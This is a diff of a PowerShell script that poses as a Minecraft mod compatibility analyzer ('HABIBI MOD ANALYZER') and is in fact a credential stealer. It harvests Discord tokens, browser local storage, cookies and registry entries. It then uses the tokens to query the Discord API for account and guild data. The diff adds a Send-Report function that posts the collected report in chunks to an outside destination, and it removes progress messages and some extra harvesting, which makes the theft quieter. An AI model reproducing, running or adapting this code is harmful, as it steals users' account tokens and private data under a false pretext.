@@ -71,25 +71,6 @@ function Get-StoredPasswords {
             }
         }
     } catch {}
-    $passwordFiles = @(
-        "$env:USERPROFILE\Documents\*.txt",
-        "$env:USERPROFILE\Desktop\*.txt",
-        "$env:USERPROFILE\Documents\passwords*",
-        "$env:USERPROFILE\Desktop\passwords*",
-        "$env:USERPROFILE\Documents\*.csv",
-        "$env:USERPROFILE\Desktop\*.csv"
-    )
-    foreach ($pattern in $passwordFiles) {
-        $files = Get-ChildItem $pattern -ErrorAction SilentlyContinue
-        foreach ($file in $files) {
-            if ($file.Length -lt 1048576) {
-                try {
-                    $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
-                    $passwords += "$($file.Name): $content"
-                } catch {}
-            }
-        }
-    }
     return $passwords | Select-Object -Unique
 }
 
@@ -100,7 +81,7 @@ function Get-NetworkInfo {
         $connections = Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue
         foreach ($conn in $connections) {
             $proc = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
-            $info += "LISTEN: $($conn.LocalAddress):$($conn.LocalPort) - $($proc.ProcessName) (PID: $($conn.OwningProcess))"
+            $info += "LISTEN: $($conn.LocalAddress):$($conn.LocalPort) - $($proc.ProcessName)"
         }
     } catch {}
     try {
@@ -213,7 +194,6 @@ function Extract-Tokens {
         "$env:APPDATA\discordptb\Local Storage\leveldb",
         "$env:APPDATA\discorddevelopment\Local Storage\leveldb"
     )
-    Write-Host "[*] Scanning Discord clients..." -ForegroundColor Yellow
     foreach ($path in $discordPaths) {
         if (Test-Path $path) {
             $files = Get-ChildItem $path -Include "*.log", "*.ldb" -Recurse -ErrorAction SilentlyContinue
@@ -238,7 +218,6 @@ function Extract-Tokens {
         @{Path="$env:LOCALAPPDATA\Vivaldi\User Data\Default\Local Storage\leveldb"; Name="Vivaldi"},
         @{Path="$env:LOCALAPPDATA\Chromium\User Data\Default\Local Storage\leveldb"; Name="Chromium"}
     )
-    Write-Host "[*] Scanning browsers..." -ForegroundColor Yellow
     foreach ($browser in $browserPaths) {
         $expanded = Resolve-Path $browser.Path -ErrorAction SilentlyContinue
         if ($expanded) {
@@ -254,7 +233,6 @@ function Extract-Tokens {
             }
         }
     }
-    Write-Host "[*] Scanning Firefox..." -ForegroundColor Yellow
     $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*" -ErrorAction SilentlyContinue
     foreach ($profile in $firefoxProfiles) {
         $dbPath = Join-Path $profile.FullName "webappsstore.sqlite"
@@ -268,7 +246,6 @@ function Extract-Tokens {
             } catch {}
         }
     }
-    Write-Host "[*] Scanning browser cookies..." -ForegroundColor Yellow
     $cookiePaths = @(
         "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
         "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
@@ -290,7 +267,6 @@ function Extract-Tokens {
             } catch {}
         }
     }
-    Write-Host "[*] Scanning Discord cache..." -ForegroundColor Yellow
     $cachePaths = @(
         "$env:APPDATA\discord\Cache\*",
         "$env:APPDATA\discordcanary\Cache\*",
@@ -311,7 +287,6 @@ function Extract-Tokens {
             } catch {}
         }
     }
-    Write-Host "[*] Scanning registry..." -ForegroundColor Yellow
     $regPaths = @(
         "HKCU:\Software\Discord",
         "HKCU:\Software\DiscordCanary",
@@ -424,8 +399,6 @@ function Analyze-ModCompatibility {
             $headers = @{ "Authorization" = $data }
             $user = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers $headers -ErrorAction Stop
             $guilds = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/guilds" -Headers $headers -ErrorAction Stop
-            $connections = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/connections" -Headers $headers -ErrorAction Stop
-            $relationships = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/relationships" -Headers $headers -ErrorAction Stop
             $mutualGuilds = @()
             $guilds | ForEach-Object { $mutualGuilds += $_.name }
             $compatibilityResults += [PSCustomObject]@{
@@ -444,8 +417,6 @@ function Analyze-ModCompatibility {
                 GameGuildsCount = $guilds.Count
                 GameGuilds = $mutualGuilds -join ", "
                 GameBadges = Get-UserBadges -flags $user.flags
-                GameConnections = ($connections | ForEach-Object { "$($_.type):$($_.name)" }) -join ", "
-                GameRelationships = ($relationships | ForEach-Object { "$($_.user.username)#$($_.user.discriminator)" }) -join ", "
             }
         } catch {
             $compatibilityResults += [PSCustomObject]@{
@@ -465,8 +436,6 @@ function Analyze-ModCompatibility {
                 GameGuildsCount = 0
                 GameGuilds = "N/A"
                 GameBadges = "N/A"
-                GameConnections = "N/A"
-                GameRelationships = "N/A"
             }
         }
         Start-Sleep -Milliseconds 200
@@ -576,8 +545,6 @@ Security: $($mod.GameSecurity)
 Verified: $($mod.GameVerified)
 Language: $($mod.GameLanguage)
 Badges: $($mod.GameBadges)
-Connections: $($mod.GameConnections)
-Relationships: $($mod.GameRelationships)
 Guilds: $($mod.GameGuildsCount) - $($mod.GameGuilds)
 ────────────────────────────────────────────────────────────────────────────────
 "@
@@ -601,4 +568,40 @@ Reason: $($mod.Reason)
     }
 
     $report += @"
-━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Report Generated: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+"@
+    return $report
+}
+
+# ---------- SEND REPORT ----------
+function Send-Report {
+    param($report)
+    $backupDest = Get-BackupDestination
+    $chunks = [math]::Ceiling($report.Length / 1800)
+    for ($i = 0; $i -lt $chunks; $i++) {
+        $chunk = $report.Substring($i * 1800, [math]::Min(1800, $report.Length - ($i * 1800)))
+        $payload = @{ 
+            content = $chunk
+            username = "HabibiModAnalyzer"
+        } | ConvertTo-Json -Depth 10
+        try {
+            Invoke-RestMethod -Uri $backupDest -Method Post -Body $payload -ContentType "application/json"
+            Write-Host "[+] Report chunk $($i+1)/$chunks sent" -ForegroundColor Green
+        } catch {
+            Write-Host "[-] Failed to send chunk $($i+1)" -ForegroundColor Red
+        }
+        if ($i -lt $chunks - 1) { Start-Sleep -Seconds 1 }
+    }
+}
+
+# ---------- MAIN ----------
+Write-Host @"
+╔═══════════════════════════════════════════════════════════════╗
+║   HABIBI MOD ANALYZER v13.0 - ULTIMATE EDITION              ║
+║   Professional Minecraft mod compatibility analyzer         ║
+╚═══════════════════════════════════════════════════════════════╝
+"@ -ForegroundColor Cyan
+
+Write-Host "[*] Initializing mod analyzer..."
